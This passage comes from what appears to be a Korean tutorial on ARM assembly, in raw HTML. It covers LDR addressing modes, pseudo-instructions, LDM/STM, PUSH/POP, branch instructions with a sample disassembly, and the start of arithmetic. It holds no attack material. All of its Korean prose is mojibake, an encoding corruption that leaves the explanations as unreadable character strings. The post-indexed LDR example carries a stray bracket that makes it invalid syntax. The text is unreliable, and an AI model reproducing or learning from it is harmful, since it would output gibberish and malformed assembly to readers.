ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ëŠ” ì ˆëŒ€ ê°±ì‹ ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.</li><li>ëŠë‚Œí‘œ(<code>!</code>)ê°€ ì—†ê³  ìƒìˆ˜ê°€ ëŒ€ê´„í˜¸ ì•ˆì— ìˆìœ¼ë©´ ì˜¤í”„ì…‹ ë°©ì‹ì…ë‹ˆë‹¤.</li></ul></li></ol><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn, offset]        <span class="comment">; Rt = *(Rn + offset)</span></span><br></pre></td></tr></table></figure><ol start="2"><li>pre-indexed ë°©ì‹<ul><li>ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ë¥¼ ë¨¼ì € ê°±ì‹ í•œ í›„ ì°¸ì¡°í•©ë‹ˆë‹¤. (Cì–¸ì–´ì˜ ì „ìœ„ ì—°ì‚°ìì™€ ìœ ì‚¬)</li></ul></li></ol><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn, offset]!       <span class="comment">; Rt = *(Rn + offset)</span></span><br><span class="line">                            <span class="comment">; Rn = Rn + offset</span></span><br></pre></td></tr></table></figure><ol start="3"><li>post-indexed ë°©ì‹<ul><li>ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ë¥¼ ë¨¼ì € ì°¸ì¡°í•œ í›„ ê°±ì‹ í•©ë‹ˆë‹¤. (Cì–¸ì–´ì˜ í›„ìœ„ ì—°ì‚°ìì™€ ìœ ì‚¬)</li></ul></li></ol><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR</span> Rt, [Rn], offset]       <span class="comment">; Rt = *Rn</span></span><br><span class="line">                            <span class="comment">; Rn = Rn + offset</span></span><br></pre></td></tr></table></figure><h3 id="ldr-%EA%B3%BC-pseudo-%EC%9D%B8%EC%8A%A4%ED%8A%B8%EB%9F%AD%EC%85%98" tabindex="-1"><code>LDR</code> ê³¼ pseudo ì¸ìŠ¤íŠ¸ëŸ­ì…˜</h3><p>ì¼ë¶€ ë””ìŠ¤ì–´ì…ˆë¸” ê²°ê³¼ì—ì„œ ë‹¤ìŒê³¼ ê°™ì´ <code>LDR</code> ì„ ì‚¬ìš©í•˜ëŠ” ë°©ì‹ì„ ë³¼ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">LDR.W</span> <span class="built_in">R8</span>, <span class="number">=0x2932E00</span>        <span class="comment">; LDR R8, [PC, x]</span></span><br><span class="line"><span class="keyword">LDR</span> <span class="built_in">R2</span>, <span class="symbol">=a04d</span> <span class="comment">; &quot;%04d&quot;      ; LDR R2, [PC, y]</span></span><br><span class="line"><span class="keyword">LDR</span> <span class="built_in">R3</span>, <span class="symbol">=__imp_realloc</span>      <span class="comment">; LDR R3, [PC, z]</span></span><br></pre></td></tr></table></figure><p>ì´ ë°©ì‹ì€ ì‚¬ì‹¤ pseudo ì¸ìŠ¤íŠ¸ëŸ­ì…˜ìœ¼ë¡œ, ë””ìŠ¤ì–´ì…ˆë¸”ëŸ¬ë“¤ì´ í¸ì˜ìƒ ìœ„ì™€ ê°™ì´ ë‚˜íƒ€ë‚´ëŠ” ê²ƒì…ë‹ˆë‹¤. ì‹¤ì œë¡œëŠ” <code>PC</code> ë¥¼ ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ë¡œ, ìƒìˆ˜ë¥¼ ì˜¤í”„ì…‹ìœ¼ë¡œ í•˜ëŠ” PC-relative ë°©ì‹ì˜ <code>LDR</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì…ë‹ˆë‹¤.</p><p>ë‹¤ë¥¸ pseudo ì¸ìŠ¤íŠ¸ëŸ­ì…˜ìœ¼ë¡œ ë ˆì´ë¸”ì´ë‚˜ í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ë ˆì§€ìŠ¤í„°ì— ëŒ€ì…í•˜ëŠ” <code>ADR</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì´ ìˆìŠµë‹ˆë‹¤. ë³´í†µ ì í”„ í…Œì´ë¸”ì´ë‚˜ ì½œë°± êµ¬í˜„ì— ì‚¬ìš©ë˜ëŠ”ë°, ë§ˆì°¬ê°€ì§€ë¡œ ë‚´ë¶€ì ìœ¼ë¡œëŠ” PC-relative ë°©ì‹ì˜ <code>LDR</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì…ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ADR</span> <span class="built_in">R5</span>, dword_9528</span><br><span class="line"><span class="symbol">LDRD.W</span> <span class="built_in">R4</span>, <span class="built_in">R5</span>, [<span class="built_in">R5</span>]</span><br></pre></td></tr></table></figure><h3 id="ldm-%EA%B3%BC-stm" tabindex="-1"><code>LDM</code> ê³¼ <code>STM</code></h3><p><code>LDM</code> ê³¼ <code>STM</code> ì€ ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ê°€ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œì—ì„œ ì—¬ëŸ¬ ê°œì˜ ê°’ì„ í•œë²ˆì— ì½ê³  ì”ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">LDM</span>&lt;mode&gt; Rn[!], &#123;Rm&#125;</span><br><span class="line"><span class="symbol">STM</span>&lt;mode&gt; Rn[!], &#123;Rm&#125;</span><br></pre></td></tr></table></figure><p><code>Rn</code> ì€ ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ë¡œ, ê°’ì„ ì½ê³  ì“¸ ë©”ëª¨ë¦¬ ì£¼ì†Œë¥¼ ê°€ë¦¬í‚µë‹ˆë‹¤. ëŠë‚Œí‘œ(<code>!</code>)ëŠ” ì„ íƒì¸ë°, ëŠë‚Œí‘œê°€ ìˆìœ¼ë©´ ë² ì´ìŠ¤ ë ˆì§€ìŠ¤í„°ë¥¼ ì‹¤í–‰ í›„ ê°±ì‹ í•¨ì„(writeback) ì˜ë¯¸í•©ë‹ˆë‹¤. <code>Rm</code> ì€ ë ˆì§€ìŠ¤í„°ë“¤ì˜ ë²”ìœ„ì´ë©°, <code>mode</code> ëŠ” ë‹¤ìŒê³¼ ê°™ì´ 4ê°€ì§€ê°€ ì¡´ì¬í•©ë‹ˆë‹¤.</p><ol><li><code>IA</code> (increment after) - <code>ë² ì´ìŠ¤ ì£¼ì†Œ</code> ë¶€í„° ê°’ì„ ì½ê³  ì“°ë©°, writebackì€ <code>ë§ˆì§€ë§‰ìœ¼ë¡œ ì½ê³  ì“´ ì£¼ì†Œ + 4</code> ì…ë‹ˆë‹¤.<ul><li>ëª…ì‹œëœ <code>mode</code> ê°€ ì—†ëŠ” ê²½ìš° ê¸°ë³¸ê°’ì…ë‹ˆë‹¤.</li></ul></li><li><code>IB</code> (increment before) - <code>ë² ì´ìŠ¤ ì£¼ì†Œ + 4</code> ë¶€í„° ê°’ì„ ì½ê³  ì“°ë©°, writebackì€ <code>ë§ˆì§€ë§‰ìœ¼ë¡œ ì½ê³  ì“´ ì£¼ì†Œ</code> ì…ë‹ˆë‹¤.</li><li><code>DA</code> (decrement after) - <code>ë² ì´ìŠ¤ ì£¼ì†Œ</code> ë¶€í„° ë‚®ì€ ë°©í–¥ìœ¼ë¡œ(ê±°ê¾¸ë¡œ) ê°’ì„ ì½ê³  ì“°ë©°, writebackì€ <code>ë§ˆì§€ë§‰ìœ¼ë¡œ ì½ê³  ì“´ ì£¼ì†Œ - 4</code> ì…ë‹ˆë‹¤.</li><li><code>DB</code> (decrement before) - <code>ë² ì´ìŠ¤ ì£¼ì†Œ - 4</code> ë¶€í„° ë‚®ì€ ë°©í–¥ìœ¼ë¡œ(ê±°ê¾¸ë¡œ) ê°’ì„ ì½ê³  ì“°ë©°, writebackì€ <code>ë§ˆì§€ë§‰ìœ¼ë¡œ ì½ê³  ì“´ ì£¼ì†Œ</code> ì…ë‹ˆë‹¤.</li></ol><p>ì˜ˆë¥¼ ë“¤ì–´, ë‹¤ìŒì€ <code>IA</code> ëª¨ë“œì™€ writebackì„ ì‚¬ìš©í•˜ì—¬ ì—¬ëŸ¬ ê°’ì„ ì½ê³  ì“°ëŠ” ì˜ˆì œì…ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR</span> <span class="built_in">R6</span>, <span class="symbol">=mem</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="number">#10</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R1</span>, <span class="number">#11</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R2</span>, <span class="number">#12</span></span><br><span class="line"><span class="keyword">LDM</span> <span class="built_in">R6</span>!, &#123;<span class="built_in">R3</span>,<span class="built_in">R4</span>,<span class="built_in">R5</span>&#125;</span><br><span class="line"><span class="keyword">STMIA</span> <span class="built_in">R6</span>!, &#123;<span class="built_in">R0</span>,<span class="built_in">R1</span>,<span class="built_in">R2</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/arm-1-introduction/4.png" alt="4.png"></p><p><code>LDM</code> ê³¼ <code>STM</code> ì€ í•œë²ˆì— ì—¬ëŸ¬ ê°’ì„ ì˜®ê¸¸ ìˆ˜ ìˆì–´, ë³´í†µ ë¸”ë¡ ë‹¨ìœ„ì˜ ë³µì‚¬ ë“±ì— ì‚¬ìš©ë©ë‹ˆë‹¤. (e.g. ë³µì‚¬í•  ê¸¸ì´ë¥¼ ì»´íŒŒì¼ ì‹œì ì— ì•Œê³  ìˆì„ ê²½ìš°, <code>memcpy</code> ëŒ€ì‹  ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤) ë˜í•œ ARM ìƒíƒœì—ì„œ í•¨ìˆ˜ì˜ ì‹œì‘ê³¼ ëì—ì„œë„ ì‚¬ìš©ë˜ëŠ”ë°, í•¨ìˆ˜ í”„ë¡¤ë¡œê·¸ì™€ ì—í•„ë¡œê·¸ì˜ ì—­í• ì„ í•©ë‹ˆë‹¤.</p><ul><li><code>STMFD</code> ì™€ <code>LDMFD</code> ëŠ” ê°ê° <code>STMDB</code> , <code>LDMIA</code> ì˜ pseudo ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì…ë‹ˆë‹¤.</li></ul><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">STMFD</span> <span class="built_in">SP</span>!, &#123;<span class="built_in">R4</span>-<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;      <span class="comment">; ë ˆì§€ìŠ¤í„°ì™€ ë¦¬í„´ ì£¼ì†Œë¥¼ ìŠ¤íƒì— ë³´ê´€í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="keyword">LDMFD</span> <span class="built_in">SP</span>!, &#123;<span class="built_in">R4</span>-<span class="built_in">R11</span>,<span class="built_in">PC</span>&#125;      <span class="comment">; ë ˆì§€ìŠ¤í„°ì™€ ë¦¬í„´ ì£¼ì†Œë¥¼ êº¼ë‚´ê³  ë°˜í™˜í•©ë‹ˆë‹¤.</span></span><br></pre></td></tr></table></figure><h2 id="push-%EC%99%80-pop" tabindex="-1"><code>PUSH</code> ì™€ <code>POP</code></h2><p><code>PUSH</code> ì™€ <code>POP</code> ì€ <code>LDM</code> , <code>STM</code> ê³¼ ë¹„ìŠ·í•˜ì§€ë§Œ, ë‘ ê°€ì§€ ë‹¤ë¥¸ íŠ¹ì§•ì´ ìˆìŠµë‹ˆë‹¤.</p><ul><li><code>PUSH</code> ì™€ <code>POP</code> ì€ <code>SP</code> ë¥¼ ë² ì´ìŠ¤ ì£¼ì†Œë¡œ ì‚¬ìš©í•©ë‹ˆë‹¤.</li><li>ì‹¤í–‰ í›„ <code>SP</code> ê°€ ìë™ìœ¼ë¡œ ê°±ì‹ ë©ë‹ˆë‹¤.</li></ul><p>ARM ì•„í‚¤í…ì²˜ì—ì„œë„ ìŠ¤íƒì€ x86/64ì™€ ë§ˆì°¬ê°€ì§€ë¡œ ë‚®ì€ ë°©í–¥ìœ¼ë¡œ ìëë‹ˆë‹¤. ë¬¸ë²•ì€ ë‹¤ìŒê³¼ ê°™ìœ¼ë©°, <code>&#123;Rn&#125;</code> ì—ëŠ” ë ˆì§€ìŠ¤í„°ë“¤ì˜ ë²”ìœ„ë¥¼ ì „ë‹¬í•´ì•¼ í•©ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUSH</span> &#123;Rn&#125;</span><br><span class="line"><span class="keyword">POP</span> &#123;Rn&#125;</span><br></pre></td></tr></table></figure><p>ì˜ˆë¥¼ ë“¤ì–´, ë‹¤ìŒì€ <code>PUSH</code> ì™€ <code>POP</code> ì„ ì´ìš©í•´ ìŠ¤íƒì—ì„œ ê°’ì„ ì½ê³  ì“°ëŠ” ì˜ˆì œì…ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">MOV.W</span> <span class="built_in">R0</span>, <span class="number">#10</span></span><br><span class="line"><span class="symbol">MOV.W</span> <span class="built_in">R1</span>, <span class="number">#11</span></span><br><span class="line"><span class="symbol">MOV.W</span> <span class="built_in">R2</span>, <span class="number">#12</span></span><br><span class="line"><span class="keyword">PUSH</span> &#123;<span class="built_in">R0</span>,<span class="built_in">R1</span>,<span class="built_in">R2</span>&#125;</span><br><span class="line"><span class="keyword">POP</span> &#123;<span class="built_in">R3</span>,<span class="built_in">R4</span>,<span class="built_in">R5</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/arm-1-introduction/5.png" alt="5.png"></p><p><code>PUSH</code> ì™€ <code>POP</code> ì€ í”íˆ Thumb ìƒíƒœì—ì„œ í•¨ìˆ˜ì˜ í”„ë¡¤ë¡œê·¸ì™€ ì—í•„ë¡œê·¸ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">PUSH.W</span> &#123;<span class="built_in">R4</span>-<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;          <span class="comment">; ë ˆì§€ìŠ¤í„°ì™€ ë¦¬í„´ ì£¼ì†Œë¥¼ ìŠ¤íƒì— ë³´ê´€í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="symbol">POP.W</span> &#123;<span class="built_in">R4</span>-<span class="built_in">R11</span>,<span class="built_in">PC</span>&#125;           <span class="comment">; ë ˆì§€ìŠ¤í„°ì™€ ë¦¬í„´ ì£¼ì†Œë¥¼ êº¼ë‚´ê³  ë°˜í™˜í•©ë‹ˆë‹¤.</span></span><br></pre></td></tr></table></figure><h2 id="%ED%95%A8%EC%88%98-%ED%98%B8%EC%B6%9C%EA%B3%BC-%EB%B6%84%EA%B8%B0" tabindex="-1">í•¨ìˆ˜ í˜¸ì¶œê³¼ ë¶„ê¸°</h2><p>ARM ì•„í‚¤í…ì²˜ëŠ” ëª©ì ì§€ ì£¼ì†Œë¥¼ ì¸ì½”ë”©í•œ ë°©ì‹ì— ë”°ë¼ í•¨ìˆ˜ í˜¸ì¶œê³¼ ë¶„ê¸°ë¥¼ ìœ„í•œ ë‹¤ì–‘í•œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì œê³µí•˜ê³  ìˆìŠµë‹ˆë‹¤. í•¨ìˆ˜ í˜¸ì¶œì˜ ë¦¬í„´ì˜ ì›ë¦¬ëŠ” x86/64ì™€ ê¸°ë³¸ì ìœ¼ë¡œ ê°™ì§€ë§Œ, ëª‡ ê°€ì§€ ì‚¬ì†Œí•œ ì°¨ì´ì ë“¤ì´ ìˆìŠµë‹ˆë‹¤.</p><ol><li>ë¦¬í„´ ì£¼ì†Œë¥¼ ìŠ¤íƒì´ë‚˜ ë§í¬ ë ˆì§€ìŠ¤í„°(<code>LR</code>)ì— ì €ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.<ul><li>í•¨ìˆ˜ ì—í•„ë¡œê·¸ì—ì„œ ë¦¬í„´ ì‹œ <code>POP &#123;PC&#125;</code> ì™€ ê°™ì´ ìŠ¤ë™ì—ì„œ ë¦¬í„´ ì£¼ì†Œë¥¼ ì§ì ‘ êº¼ë‚´ <code>PC</code> ì— ëŒ€ì…í•˜ê±°ë‚˜, <code>BX LR</code> ê³¼ ê°™ì´ ë§í¬ ë ˆì§€ìŠ¤í„°ë¡œ ë¶„ê¸°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ul></li><li>ë¶„ê¸°í•  ë•Œ ëª©ì ì§€ ì£¼ì†Œì˜ ìµœí•˜ìœ„ ë¹„íŠ¸(LSB)ì— ë”°ë¼ ARM ìƒíƒœì™€ Thumb ìƒíƒœë¥¼ ì˜¤ê°ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li><li>í•¨ìˆ˜ í˜¸ì¶œ ê·œì•½ì˜ ì°¨ì´ê°€ ìˆìŠµë‹ˆë‹¤.<ul><li>4ê°œ ë§¤ê°œë³€ìˆ˜ê¹Œì§€ ë ˆì§€ìŠ¤í„° <code>R0</code> , <code>R1</code> , <code>R2</code> , <code>R3</code> ì„ í†µí•´ ì „ë‹¬í•˜ë©°, ë‚˜ë¨¸ì§€ëŠ” ìŠ¤íƒì„ í†µí•´ ì „ë‹¬í•©ë‹ˆë‹¤.</li><li>ë¦¬í„´ ê°’ì€ <code>R0</code> ì— ë³´ê´€í•©ë‹ˆë‹¤.</li></ul></li></ol><p>í•¨ìˆ˜ í˜¸ì¶œê³¼ ë¶„ê¸°ì— ì‚¬ìš©ë˜ëŠ” ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ <code>B</code> , <code>BX</code> , <code>BL</code> ê³¼ <code>BLX</code> ê°€ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">B</span> label</span><br><span class="line"><span class="keyword">BL</span> label</span><br></pre></td></tr></table></figure><p><code>B</code> ëŠ” ë‹¨ìˆœí•œ ë¶„ê¸°ë¡œ, x86/64ì—ì„œì˜ <code>JMP</code> ì™€ ë™ì¼í•©ë‹ˆë‹¤. í•¨ìˆ˜ í˜¸ì¶œì—ëŠ” ê±°ì˜ ì‚¬ìš©ë˜ì§€ ì•Šì§€ë§Œ, ë¦¬í„´í•˜ì§€ ì•ŠëŠ” í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê¸° ìœ„í•´ ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì£¼ë¡œ ë°˜ë³µë¬¸ì´ë‚˜ ì¡°ê±´ë¬¸ì—ì„œ ì½”ë“œ ë¸”ë¡ì˜ ì‹œì‘ìœ¼ë¡œ ëŒì•„ê°€ê±°ë‚˜ íƒˆì¶œí•˜ê¸° ìœ„í•´ ì‚¬ìš©ë©ë‹ˆë‹¤. <code>BL</code> ì€ branch with linkë¡œ, ë¶„ê¸° ì „ <code>LR</code> ì— ë‹¤ìŒ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ì£¼ì†Œë¥¼ ì €ì¥í•©ë‹ˆë‹¤. x86/64ì—ì„œì˜ <code>CALL</code> ê³¼ ë¹„ìŠ·í•œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì…ë‹ˆë‹¤. <code>B</code> ì™€ <code>BL</code> ì€ ëª¨ë‘ ë ˆì´ë¸”ì˜ ì˜¤í”„ì…‹ë§Œ ì¸ìë¡œ ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BX</span> Rm</span><br></pre></td></tr></table></figure><p><code>BX</code> ëŠ” branch and exchangeë¡œ, <code>B</code> ì™€ ë¹„ìŠ·í•˜ì§€ë§Œ ëª©ì ì§€ ì£¼ì†Œê°€ ë ˆì§€ìŠ¤í„°ë¡œ ì „ë‹¬ë˜ê³  ARMê³¼ Thumb ìƒíƒœë¥¼ ì˜¤ê°ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤. (ëª©ì ì§€ ì£¼ì†Œì˜ ìµœí•˜ìœ„ ë¹„íŠ¸ê°€ 1ì´ë©´ Thumb ìƒíƒœê°€ ë©ë‹ˆë‹¤) í”íˆ í•¨ìˆ˜ ì—í•„ë¡œê·¸ì—ì„œ ë¦¬í„´ì„ ìœ„í•´ ì‚¬ìš©ë˜ê±°ë‚˜, (i.e. <code>BX LR</code>) ë‹¤ë¥¸ ìƒíƒœì˜ ì½”ë“œë¡œ ë¶„ê¸°í•  ë•Œ ì‚¬ìš©ë©ë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BLX</span> label</span><br><span class="line"><span class="keyword">BLX</span> Rm</span><br></pre></td></tr></table></figure><p><code>BLX</code> ëŠ” branch with link and exchangeë¡œ, <code>BL</code> ê³¼ ë¹„ìŠ·í•˜ì§€ë§Œ ARMê³¼ Thumb ìƒíƒœë¥¼ ì „í™˜í•  ìˆ˜ ìˆìœ¼ë©° ì¸ìë¡œ ë ˆì§€ìŠ¤í„°ì— ë³´ê´€ëœ ëª©ì ì§€ ì£¼ì†Œë‚˜ ë ˆì´ë¸”ì˜ ì˜¤í”„ì…‹ ëª¨ë‘ë¥¼ ì „ë‹¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. (<code>BLX</code> ê°€ ë ˆì´ë¸”ì˜ ì˜¤í”„ì…‹ì„ ì¸ìë¡œ ë°›ëŠ” ê²½ìš°ëŠ” ë°˜ë“œì‹œ ìƒíƒœë¥¼ ì „í™˜í•˜ê¸° ìœ„í•¨ì…ë‹ˆë‹¤) <code>BL</code>ê³¼ <code>BLX</code> ëŠ” ëª¨ë‘ í•¨ìˆ˜ í˜¸ì¶œì— ì‚¬ìš©ë˜ëŠ”ë°, <code>BL</code> ëŠ” í˜„ì¬ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ìœ¼ë¡œë¶€í„° 32MB ë²”ìœ„ ì•ˆì— ìˆëŠ” í•¨ìˆ˜ í˜¸ì¶œì— ì‚¬ìš©í•˜ë©° <code>BLX</code> ëŠ” í•¨ìˆ˜ì˜ ì£¼ì†Œê°€ ì •í•´ì§€ì§€ ì•Šì€ (e.g. í•¨ìˆ˜ í¬ì¸í„°) ê²½ìš° ì‚¬ìš©í•©ë‹ˆë‹¤. Thumb ìƒíƒœì—ì„œ <code>BLX</code> ëŠ” ì£¼ë¡œ ë¼ì´ë¸ŒëŸ¬ë¦¬ í•¨ìˆ˜ í˜¸ì¶œì— ì‚¬ìš©ë˜ë©°, ARM ìƒíƒœì—ì„œëŠ” <code>BL</code> ì„ ëŒ€ì‹  ì‚¬ìš©í•©ë‹ˆë‹¤.</p><p>ë‹¤ìŒ ì˜ˆì œëŠ” ì–´ë–¤ í•¨ìˆ˜ë¥¼ ë””ìŠ¤ì–´ì…ˆë¸”í•œ ê²°ê³¼ì¸ë°, í•¨ìˆ˜ í˜¸ì¶œê³¼ ë¶„ê¸°ë¥¼ ìœ„í•œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì´ ì–´ë–»ê²Œ ì‚¬ìš©ë˜ê³  ìˆëŠ”ì§€ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">PUSH.W</span> &#123;<span class="built_in">R4</span>,<span class="built_in">R5</span>,<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;</span><br><span class="line"><span class="symbol">ADDW</span> <span class="built_in">R11</span>, <span class="built_in">SP</span>, <span class="number">#8</span></span><br><span class="line"><span class="keyword">LDR</span> <span class="built_in">R3</span>, <span class="symbol">=__imp_malloc</span></span><br><span class="line"><span class="keyword">ADDS</span> <span class="built_in">R5</span>, <span class="built_in">R0</span>, <span class="number">#7</span></span><br><span class="line"><span class="symbol">BFC.W</span> <span class="built_in">R5</span>, <span class="number">#0</span>, <span class="number">#3</span></span><br><span class="line"><span class="keyword">LDR</span> <span class="built_in">R3</span>, [<span class="built_in">R3</span>]</span><br><span class="line"><span class="symbol">ADDS.W</span> <span class="built_in">R0</span>, <span class="built_in">R5</span>, <span class="number">#8</span></span><br><span class="line"><span class="keyword">BLX</span> <span class="built_in">R3</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R4</span>, <span class="built_in">R0</span></span><br><span class="line"><span class="keyword">CBZ</span> <span class="built_in">R4</span>, loc_100C3AE</span><br><span class="line"><span class="keyword">ASRS</span> <span class="built_in">R3</span>, <span class="built_in">R5</span>, <span class="number">#0x1F</span></span><br><span class="line"><span class="keyword">STR</span> <span class="built_in">R3</span>, [<span class="built_in">R4</span>,<span class="number">#4</span>]</span><br><span class="line"><span class="keyword">STR</span> <span class="built_in">R5</span>, [<span class="built_in">R4</span>]</span><br><span class="line"><span class="keyword">B</span> loc_100C3B8</span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_100C3AE:</span></span><br><span class="line"><span class="keyword">LDR</span> <span class="built_in">R1</span>, <span class="symbol">=aFailed</span> <span class="comment">; &quot;failed...&quot;</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R2</span>, <span class="built_in">R5</span></span><br><span class="line"><span class="keyword">MOVS</span> <span class="built_in">R0</span>, <span class="number">#7</span></span><br><span class="line"><span class="keyword">BL</span> foo</span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_100C3B8:</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="built_in">R4</span></span><br><span class="line"><span class="symbol">POP.W</span> &#123;<span class="built_in">R4</span>,<span class="built_in">R5</span>,<span class="built_in">R11</span>,<span class="built_in">PC</span>&#125;</span><br></pre></td></tr></table></figure><ul><li>1í–‰ì˜ <code>PUSH.W &#123;R4,R5,R11,LR&#125;</code> ì€ í•¨ìˆ˜ í”„ë¡¤ë¡œê·¸, 24í–‰ì˜ <code>POP.W &#123;R4,R5,R11,PC&#125;</code> ëŠ” í•¨ìˆ˜ ì—í•„ë¡œê·¸ì— í•´ë‹¹í•©ë‹ˆë‹¤.</li><li>8í–‰ì—ì„œ <code>BLX</code> ë¥¼ ì´ìš©í•´ <code>malloc</code> ë¼ì´ë¸ŒëŸ¬ë¦¬ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê³  ìˆìŠµë‹ˆë‹¤.</li><li>20í–‰ì—ì„œ <code>BL</code> ì„ ì´ìš©í•´ <code>foo</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê³  ìˆìŠµë‹ˆë‹¤.</li></ul><h2 id="%EC%82%B0%EC%88%A0-%EC%97%B0%EC%82%B0" tabindex="-1">ì‚°ìˆ  ì—°ì‚°</h2><p><code>MOV</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ê°’ì„ ëŒ€ì…í•˜ëŠ” ê°€ì¥ ë‹¨ìˆœí•œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì…ë‹ˆë‹¤. ëŒ€ì…í•˜ëŠ” ê°’ì€ ìƒìˆ˜ê±°ë‚˜ ë ˆì§€ìŠ¤í„°ì˜ ê°’, ë˜ëŠ” ë ˆì§€ìŠ¤í„°ì˜ ê°’ì— ë°°ëŸ´ ì‹œí”„í„°ë¥¼ ì‚¬ìš©í•œ ê°’ì…ë‹ˆë‹¤. ë°°ëŸ´ ì‹œí”„í„°ë¡œëŠ” ê°’ì— ëŒ€í•œ ì™¼ìª½ ì‹œí”„íŠ¸(<code>LSL</code>), ì˜¤ë¥¸ìª½ ì‹œí”„íŠ¸(<code>LSR</code>, <code>ASR</code>), íšŒì „(<code>ROR</code>, <code>RRX</code>)ì´ 